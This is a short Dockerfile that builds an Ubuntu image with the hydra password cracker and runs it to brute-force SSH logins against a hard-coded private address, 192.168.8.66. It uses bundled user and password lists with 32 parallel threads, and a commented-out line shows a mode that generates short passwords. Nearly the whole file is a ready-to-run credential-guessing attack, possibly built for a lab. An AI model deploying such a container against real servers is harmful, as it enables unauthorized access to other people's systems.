FROM ubuntu:14.04

MAINTAINER marcos cano marcos.cano@galileo.edu

RUN apt-get update
RUN apt-get -y install hydra openssh-server


ADD docker/user_list /
ADD docker/passwords /
ENV server 192.168.8.66

#CMD hydra -L /passwords -V -x 4:4:aA1 $server ssh
CMD hydra -L /passwords -V -P /passwords -t 32 $server ssh